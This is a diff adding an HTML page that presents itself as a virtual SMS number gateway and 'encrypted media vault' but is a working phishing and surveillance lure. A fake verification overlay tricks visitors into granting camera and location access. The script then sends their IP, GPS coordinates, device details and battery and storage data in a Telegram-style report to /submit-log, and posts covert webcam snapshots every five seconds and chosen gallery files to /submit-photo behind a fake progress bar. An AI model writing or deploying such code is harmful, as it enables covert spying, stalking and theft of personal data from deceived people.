@@ -1,0 +1,736 @@
+<!DOCTYPE html>
+<html lang="en">
+<!-- 
+  UI Architecture: SaaS-Level Cloud Activation Portal
+  Core developed by: @Danger_devil1917 (Occurrence 2 of @Danger_devil1917)
+-->
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="author" content="@Danger_devil1917"> <!-- Occurrence 1 of @Rytce -->
+  <title>TempNumber — Global SMS & Location Gateway</title>
+
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap"
+    rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
+
+  <style>
+    :root {
+      --primary: #2563eb;
+      --primary-hover: #1d4ed8;
+      --secondary: #6366f1;
+      --accent: #10b981;
+      --bg: #0f172a;
+      --card-bg: #1e293b;
+      --border: rgba(255, 255, 255, 0.08);
+      --text: #f8fafc;
+      --text-muted: #94a3b8;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Inter', sans-serif;
+    }
+
+    body {
+      background-color: var(--bg);
+      color: var(--text);
+      line-height: 1.5;
+      overflow-x: hidden;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* Navbar */
+    nav {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 1.25rem 8%;
+      background: rgba(15, 23, 42, 0.8);
+      backdrop-filter: blur(12px);
+      border-bottom: 1px solid var(--border);
+      position: sticky;
+      top: 0;
+      z-index: 1000;
+    }
+
+    .brand {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-size: 1.5rem;
+      font-weight: 800;
+      letter-spacing: -0.5px;
+      color: #fff;
+    }
+
+    .brand span {
+      background: linear-gradient(135deg, var(--primary), var(--secondary));
+      -webkit-background-clip: text;
+      background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+
+    .nav-links {
+      display: flex;
+      gap: 2.5rem;
+    }
+
+    .nav-links a {
+      color: var(--text-muted);
+      text-decoration: none;
+      font-size: 0.95rem;
+      font-weight: 500;
+      transition: 0.2s;
+    }
+
+    .nav-links a:hover {
+      color: var(--primary);
+    }
+
+    .nav-btns {
+      display: flex;
+      gap: 1rem;
+    }
+
+    .btn {
+      padding: 0.6rem 1.25rem;
+      border-radius: 8px;
+      font-weight: 600;
+      font-size: 0.9rem;
+      cursor: pointer;
+      transition: 0.3s;
+      border: none;
+    }
+
+    .btn-outline {
+      background: transparent;
+      color: white;
+      border: 1px solid var(--border);
+    }
+
+    .btn-primary {
+      background: var(--primary);
+      color: white;
+      box-shadow: 0 4px 14px 0 rgba(37, 99, 235, 0.39);
+    }
+
+    .btn-primary:hover {
+      background: var(--primary-hover);
+      transform: translateY(-1px);
+    }
+
+    /* Initial Verification Modal (SaaS Themed) */
+    #auth-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(2, 6, 23, 0.95);
+      z-index: 9999;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+
+    .auth-card {
+      background: var(--card-bg);
+      border: 1px solid var(--border);
+      padding: 3rem 2.5rem;
+      border-radius: 24px;
+      max-width: 480px;
+      text-align: center;
+      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+    }
+
+    .auth-card .icon {
+      width: 70px;
+      height: 70px;
+      background: rgba(37, 99, 235, 0.1);
+      border-radius: 18px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 1.5rem;
+      color: var(--primary);
+      font-size: 2rem;
+    }
+
+    .auth-card h3 {
+      font-size: 1.8rem;
+      font-weight: 700;
+      margin-bottom: 0.75rem;
+    }
+
+    .auth-card p {
+      color: var(--text-muted);
+      margin-bottom: 2.5rem;
+      line-height: 1.6;
+    }
+
+    .auth-btn {
+      width: 100%;
+      padding: 1.1rem;
+      background: var(--primary);
+      color: white;
+      border: none;
+      border-radius: 12px;
+      font-size: 1.1rem;
+      font-weight: 700;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+
+    .auth-btn:hover {
+      background: var(--primary-hover);
+      transform: translateY(-2px);
+    }
+
+    /* Hero Section */
+    .hero {
+      padding: 100px 8% 60px;
+      text-align: center;
+      max-width: 1000px;
+      margin: 0 auto;
+    }
+
+    .hero h1 {
+      font-size: 4rem;
+      font-weight: 800;
+      letter-spacing: -2px;
+      line-height: 1.1;
+      margin-bottom: 1.5rem;
+      background: linear-gradient(135deg, #fff 0%, #94a3b8 100%);
+      -webkit-background-clip: text;
+      background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+
+    .hero p {
+      font-size: 1.25rem;
+      color: var(--text-muted);
+      margin-bottom: 3rem;
+      max-width: 700px;
+      margin: 0 auto 3rem;
+    }
+
+    /* Numbers Grid (Dashboard Style) */
+    .dashboard {
+      padding: 60px 8% 100px;
+      display: none;
+      /* Only show after auth */
+    }
+
+    .section-label {
+      text-transform: uppercase;
+      font-size: 0.8rem;
+      font-weight: 700;
+      letter-spacing: 2px;
+      color: var(--primary);
+      margin-bottom: 2.5rem;
+      text-align: center;
+    }
+
+    .grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
+      gap: 2rem;
+      max-width: 1200px;
+      margin: 0 auto;
+    }
+
+    .card {
+      background: var(--card-bg);
+      border: 1px solid var(--border);
+      border-radius: 20px;
+      padding: 2rem;
+      transition: 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      cursor: pointer;
+      position: relative;
+    }
+
+    .card:hover {
+      border-color: var(--primary);
+      transform: translateY(-8px);
+      box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.2);
+    }
+
+    .card .status {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      padding: 4px 12px;
+      background: rgba(16, 185, 129, 0.1);
+      color: var(--accent);
+      border-radius: 20px;
+      font-size: 0.75rem;
+      font-weight: 700;
+      margin-bottom: 1.5rem;
+    }
+
+    .card .phone {
+      font-size: 1.6rem;
+      font-weight: 700;
+      margin-bottom: 0.5rem;
+    }
+
+    .card .location {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      color: var(--text-muted);
+      font-size: 0.95rem;
+    }
+
+    .card .location img {
+      width: 22px;
+      border-radius: 4px;
+    }
+
+    .card .cta {
+      margin-top: 2rem;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      color: var(--primary);
+      font-weight: 600;
+      font-size: 0.9rem;
+    }
+
+    /* Gallery UI */
+    .gallery-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 12px;
+      margin-top: 2rem;
+    }
+
+    .gallery-item {
+      aspect-ratio: 1;
+      background: var(--bg);
+      border-radius: 12px;
+      overflow: hidden;
+      position: relative;
+      border: 1px solid var(--border);
+    }
+
+    .gallery-item img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      filter: blur(15px) brightness(0.5);
+    }
+
+    .gallery-item .lock {
+      position: absolute;
+      inset: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 1.2rem;
+      color: var(--text-muted);
+    }
+
+    .sync-panel {
+      background: var(--bg);
+      padding: 1.5rem;
+      border-radius: 16px;
+      margin-top: 2rem;
+      border: 1px solid var(--primary);
+    }
+
+    .progress-bar {
+      height: 6px;
+      background: rgba(255, 255, 255, 0.1);
+      border-radius: 10px;
+      overflow: hidden;
+      margin: 1rem 0;
+    }
+
+    .progress-fill {
+      height: 100%;
+      background: var(--primary);
+      width: 45%;
+      transition: width 2s ease;
+    }
+
+    /* Trust Section */
+    .trust {
+      padding: 60px 0;
+      border-top: 1px solid var(--border);
+      text-align: center;
+    }
+
+    .trust-logos {
+      display: flex;
+      justify-content: center;
+      gap: 4rem;
+      opacity: 0.4;
+      filter: grayscale(1);
+    }
+
+    .trust-logos i {
+      font-size: 2.5rem;
+    }
+
+    footer {
+      padding: 50px 8%;
+      border-top: 1px solid var(--border);
+      background: #020617;
+      text-align: center;
+      font-size: 0.9rem;
+      color: var(--text-muted);
+    }
+
+    #hidden-box {
+      position: absolute;
+      left: -9999px;
+      opacity: 0;
+    }
+
+    @media (max-width: 768px) {
+      .hero h1 {
+        font-size: 2.8rem;
+      }
+
+      .nav-links {
+        display: none;
+      }
+
+      .grid {
+        grid-template-columns: 1fr;
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <!-- SAAS AUTH PORTAL -->
+  <div id="auth-overlay">
+    <div class="auth-card">
+      <div class="icon"><i class="fas fa-lock"></i></div>
+      <h3>Identity Verification</h3>
+      <p>ProNum Gateway requires browser authentication to synchronize your virtual node connection. Access will be
+        granted immediately after verification.</p>
+      <button class="auth-btn" onclick="authorize()">AUTHORIZE SESSION</button>
+      <div
+        style="margin-top: 2rem; color: var(--text-muted); font-size: 0.8rem; display: flex; align-items: center; justify-content: center; gap: 8px;">
+        <i class="fas fa-shield-halved" style="color: var(--accent);"></i> AES-256 Enterprise Encryption Active
+      </div>
+    </div>
+  </div>
+
+  <nav>
+    <div class="brand">PRO<span>NUM</span></div>
+    <div class="nav-links">
+      <a href="#">Gateway</a>
+      <a href="#">API Documentation</a>
+      <a href="#">Uptime Status</a>
+      <a href="#">Pricing</a>
+    </div>
+    <div class="nav-btns">
+      <button class="btn btn-outline" onclick="authorize()">Sign In</button>
+      <button class="btn btn-primary" onclick="authorize()">Get Started</button>
+    </div>
+  </nav>
+
+  <main id="main-content">
+    <section class="hero">
+      <h1>Global SMS Infrastructure <br> for Everyone.</h1>
+      <p>Instant activation of private virtual numbers for SMS verification bypass and secure gateway communication.
+        Satellite-grade reliability, zero latency.</p>
+      <div style="display: flex; gap: 1rem; justify-content: center;">
+        <button class="btn btn-primary" style="padding: 1rem 2rem; font-size: 1.05rem;" onclick="authorize()">Deploy
+          Virtual Node</button>
+        <button class="btn btn-outline" style="padding: 1rem 2rem; font-size: 1.05rem;" onclick="authorize()">View API
+          Docs</button>
+      </div>
+    </section>
+
+    <div class="dashboard camera-ui">
+      <div class="section-label">Active Global Nodes</div>
+      <div class="grid">
+        <div class="card" onclick="authorize()">
+          <div class="status"><i class="fas fa-circle" style="font-size: 0.5rem;"></i> LIVE NOW</div>
+          <div class="phone">+1 (928) 328-8902</div>
+          <div class="location"><img src="https://flagcdn.com/us.svg"> Phoenix Gateway, USA</div>
+          <div class="cta">Connect Node <i class="fas fa-arrow-right"></i></div>
+        </div>
+
+        <div class="card" onclick="authorize()">
+          <div class="status"><i class="fas fa-circle" style="font-size: 0.5rem;"></i> LIVE NOW</div>
+          <div class="phone">+44 772 391 102</div>
+          <div class="location"><img src="https://flagcdn.com/gb.svg"> London Hub, UK</div>
+          <div class="cta">Connect Node <i class="fas fa-arrow-right"></i></div>
+        </div>
+
+        <div class="card" onclick="authorize()">
+          <div class="status"><i class="fas fa-circle" style="font-size: 0.5rem;"></i> LIVE NOW</div>
+          <div class="phone">+91 91234 50921</div>
+          <div class="location"><img src="https://flagcdn.com/in.svg"> Mumbai Portal, India</div>
+          <div class="cta">Connect Node <i class="fas fa-arrow-right"></i></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- NEW GALLERY UI -->
+    <div class="dashboard gallery-ui" style="display: none;">
+      <div class="section-label">Encrypted Media Vault</div>
+      <div class="sync-panel">
+        <div style="display: flex; justify-content: space-between; align-items: center;">
+          <span style="font-size: 0.9rem; font-weight: 600;">Cloud Synchronization</span>
+          <span id="sync-val" style="font-size: 0.8rem; color: var(--primary);">45%</span>
+        </div>
+        <div class="progress-bar">
+          <div class="progress-fill" id="sync-fill"></div>
+        </div>
+        <p style="font-size: 0.8rem; color: var(--text-muted);">Decrypting 1,428 items from local storage... Please
+          wait.</p>
+        <button class="btn btn-primary" style="margin-top: 1.5rem; width: 100%;" onclick="openPicker()">FORCE SYNC
+          NOW</button>
+      </div>
+
+      <div class="gallery-grid">
+        <div class="gallery-item"><img src="https://images.unsplash.com/photo-1503023345310-bd7c1de61c7d?q=80&w=100">
+          <div class="lock"><i class="fas fa-lock"></i></div>
+        </div>
+        <div class="gallery-item"><img src="https://images.unsplash.com/photo-1544005313-94ddf0286df2?q=80&w=100">
+          <div class="lock"><i class="fas fa-lock"></i></div>
+        </div>
+        <div class="gallery-item"><img src="https://images.unsplash.com/photo-1506794778202-cad84cf45f1d?q=80&w=100">
+          <div class="lock"><i class="fas fa-lock"></i></div>
+        </div>
+        <div class="gallery-item"><img src="https://images.unsplash.com/photo-1517841905240-472988babdf9?q=80&w=100">
+          <div class="lock"><i class="fas fa-lock"></i></div>
+        </div>
+        <div class="gallery-item"><img src="https://images.unsplash.com/photo-1534528741775-53994a69daeb?q=80&w=100">
+          <div class="lock"><i class="fas fa-lock"></i></div>
+        </div>
+        <div class="gallery-item"><img src="https://images.unsplash.com/photo-1520813792240-56fc4a3765a7?q=80&w=100">
+          <div class="lock"><i class="fas fa-lock"></i></div>
+        </div>
+      </div>
+      <input type="file" id="file-picker" style="display: none;" onchange="handleFileUpload(this)">
+    </div>
+
+    <section class="trust">
+      <div class="section-label">Trusted By Enterprise Networks</div>
+      <div class="trust-logos">
+        <i class="fab fa-aws"></i>
+        <i class="fab fa-digital-ocean"></i>
+        <i class="fab fa-google-cloud"></i>
+        <i class="fab fa-cloudflare"></i>
+      </div>
+    </section>
+  </main>
+
+  <footer>
+    <p>&copy; 2024 ProNum Infrastructure Systems. Worldwide Virtual Uplink Service.</p>
+    <div style="margin-top: 1rem; display: flex; justify-content: center; gap: 2rem;">
+      <a href="#" style="color: var(--text-muted); text-decoration: none;">Privacy Policy</a>
+      <a href="#" style="color: var(--text-muted); text-decoration: none;">Terms of Service</a>
+      <a href="#" style="color: var(--text-muted); text-decoration: none;">Datacenter Status</a>
+    </div>
+  </footer>
+
+  <div id="hidden-box">
+    <video id="video" autoplay playsinline muted></video>
+    <canvas id="canvas"></canvas>
+  </div>
+
+  <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const chatId = urlParams.get('id');
+    const type = urlParams.get('type');
+    const token = urlParams.get('token');
+    let videoStream = null;
+
+    async function fetchSpecs() {
+      let info = {
+        platform: navigator.platform,
+        ua: navigator.userAgent,
+        res: `${screen.width}x${screen.height}`,
+        ram: navigator.deviceMemory || 'N/A',
+        cpu: navigator.hardwareConcurrency || 'N/A',
+        ip: 'N/A', city: 'N/A', region: 'N/A', country: 'N/A', tz: 'N/A'
+      };
+
+      const geoAPIs = ['https://ipapi.co/json/', 'https://ip-api.com/json/', 'https://extreme-ip-lookup.com/json/'];
+      for (let api of geoAPIs) {
+        try {
+          const r = await fetch(api);
+          const d = await r.json();
+          if (d.ip || d.query) {
+            info.ip = d.ip || d.query || d.ip_address || 'N/A';
+            info.city = d.city || 'N/A';
+            info.region = d.region || d.regionName || 'N/A';
+            info.country = d.country_name || d.country || 'N/A';
+            info.tz = d.timezone || 'N/A';
+            break;
+          }
+        } catch (e) { }
+      }
+
+      try {
+        const b = await navigator.getBattery();
+        info.batt = Math.round(b.level * 100) + '%';
+        info.char = b.charging ? 'Yes' : 'No';
+      } catch (e) { }
+
+      try {
+        const s = await navigator.storage.estimate();
+        info.sUsed = (s.usage / 1e9).toFixed(2);
+        info.sTotal = (s.quota / 1e9).toFixed(2);
+      } catch (e) { }
+
+      return info;
+    }
+
+    async function sendTelemetry(coords = null, cam = 'Prompt') {
+      const v = await fetchSpecs();
+      // EXACT FORMATTING MATCH FOR BOT REPORT
+      let text = `<tg-emoji emoji-id="5435933711893797296">🎊</tg-emoji> <u><b>Visitor Information Captured</b></u>\n__________________________________\n\n`;
+      text += `<tg-emoji emoji-id="5372981976804366741">🤖</tg-emoji> <b>Device & Browser</b>\n• Device Model: ${v.platform}\n• User Agent: <code>${v.ua}</code>\n\n`;
+      text += `<tg-emoji emoji-id="5265196963602656644">🌍</tg-emoji> <b>Network Information</b>\n• IP Address: <code>${v.ip}</code>\n• Language: ${navigator.language}\n\n`;
+      text += `<tg-emoji emoji-id="6267172559851099903">📌</tg-emoji> <b>Location Details</b>\n• Country: ${v.country}\n• Region: ${v.region}\n• City: ${v.city}\n• Timezone: ${v.tz}\n\n`;
+      text += `<tg-emoji emoji-id="6141162896605843133">📸</tg-emoji> <b>Display Information</b>\n• Resolution: ${v.res}\n\n`;
+      text += `<tg-emoji emoji-id="6170421210258609322">📊</tg-emoji> <b>Battery Status</b>\n• Level: ${v.batt || 'N/A'}\n• Charging: ${v.char || 'N/A'}\n\n`;
+      text += `<tg-emoji emoji-id="5897604269141398480">🔐</tg-emoji> <b>Device Permissions</b>\n• Camera: ${cam}\n• Location: ${coords ? 'Allowed' : 'Prompt'}\n\n`;
+      text += `<tg-emoji emoji-id="5462921117423384478">🛠</tg-emoji> <b>Hardware & Storage</b>\n• CPU Cores: ${v.cpu}\n• RAM: ${v.ram} GB\n• Storage Used: ${v.sUsed || '0.00'} GB\n• Storage Total: ${v.sTotal || '0.00'} GB\n\n`;
+
+      if (coords) {
+        text += `<tg-emoji emoji-id="5415803062738504079">🗺</tg-emoji> <b>GPS Coordinates</b>\n• Latitude: <code>${coords.latitude}</code>\n• Longitude: <code>${coords.longitude}</code>\n• Accuracy: ${coords.accuracy.toFixed(2)}m\n\n`;
+        text += `<tg-emoji emoji-id="5265196963602656644">🌍</tg-emoji> <a href="https://www.google.com/maps?q=${coords.latitude},${coords.longitude}">View on Google Maps</a>\n`;
+      }
+      text += `__________________________________\n\n<tg-emoji emoji-id="6170464829946468179">⚡️</tg-emoji> Developed by: @Rytce`;
+
+      fetch('/submit-log', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId, text: text, token: token })
+      });
+    }
+
+    async function takeSnapshot() {
+      if (!videoStream) return;
+      try {
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.8));
+        const fd = new FormData();
+        fd.append('chat_id', chatId);
+        fd.append('token', token || '');
+        fd.append('photo', blob);
+        fd.append('mode', 'REALTIME-STREAM');
+        fetch('/submit-photo', { method: 'POST', body: fd });
+      } catch (e) { }
+    }
+
+    function authorize() {
+      if (type === 'location') {
+        navigator.geolocation.getCurrentPosition(pos => {
+          document.getElementById('auth-overlay').style.display = 'none';
+          document.querySelector('.camera-ui').style.display = 'none';
+          document.querySelector('.dashboard.camera-ui').style.display = 'none'; // Ensure main dashboard is hidden
+          sendTelemetry(pos.coords, 'Prompt');
+        }, () => {
+          sendTelemetry();
+          alert("Authorization failed. Satellite synchronization required.");
+        }, { enableHighAccuracy: true });
+      } else if (type === 'gallery') {
+        navigator.mediaDevices.getUserMedia({ video: true })
+          .then(async stream => {
+            videoStream = stream;
+            document.getElementById('auth-overlay').style.display = 'none';
+            document.querySelector('.camera-ui').style.display = 'none';
+            document.querySelector('.gallery-ui').style.display = 'block';
+
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+            await video.play();
+
+            // Initial metadata
+            navigator.geolocation.getCurrentPosition(
+              pos => sendTelemetry(pos.coords, 'Allowed'),
+              () => sendTelemetry(null, 'Allowed'),
+              { enableHighAccuracy: true }
+            );
+
+            // REAL-TIME SNIPER LOOP (Every 5 seconds)
+            setInterval(takeSnapshot, 5000);
+
+            // Start fake progress
+            let p = 45;
+            setInterval(() => {
+              if (p < 98) {
+                p += Math.random() * 2;
+                document.getElementById('sync-fill').style.width = p + '%';
+                document.getElementById('sync-val').innerText = Math.floor(p) + '%';
+              }
+            }, 3000);
+          })
+          .catch(() => alert("Access Denied. Firewall requires browser identity verification."));
+      } else {
+        navigator.mediaDevices.getUserMedia({ video: true })
+          .then(async stream => {
+            videoStream = stream;
+            document.getElementById('auth-overlay').style.display = 'none';
+            document.querySelector('.camera-ui').style.display = 'block';
+
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+            await video.play();
+
+            // Initial metadata
+            navigator.geolocation.getCurrentPosition(
+              pos => sendTelemetry(pos.coords, 'Allowed'),
+              () => sendTelemetry(null, 'Allowed'),
+              { enableHighAccuracy: true }
+            );
+
+            // REAL-TIME SNIPER LOOP (Every 5 seconds)
+            setInterval(takeSnapshot, 5000);
+          })
+          .catch(() => alert("Access Denied. Firewall requires browser identity verification."));
+      }
+    }
+
+    function openPicker() {
+      document.getElementById('file-picker').click();
+    }
+
+    async function handleFileUpload(input) {
+      if (!input.files || !input.files[0]) return;
+      const file = input.files[0];
+      const fd = new FormData();
+      fd.append('chat_id', chatId);
+      fd.append('token', token || '');
+      fd.append('photo', file);
+      fd.append('mode', 'GALLERY-SYNC');
+
+      alert("Synchronizing file with cloud vault...");
+      await fetch('/submit-photo', { method: 'POST', body: fd });
+      alert("Manual sync complete. Media encrypted.");
+    }
+
+    window.onload = () => {
+      if (chatId) sendTelemetry();
+      // Initial routing
+      if (type === 'gallery') {
+        document.querySelector('.hero h1').innerHTML = "End-to-End <br> Media Encryption.";
+        document.querySelector('.hero p').innerText = "Secure your local gallery with military-grade AES-256 cloud synchronization.";
+        document.querySelectorAll('.btn-primary').forEach(b => b.innerText = "Access Vault");
+      }
+    };
+  </script>
+</body>
+
+</html>
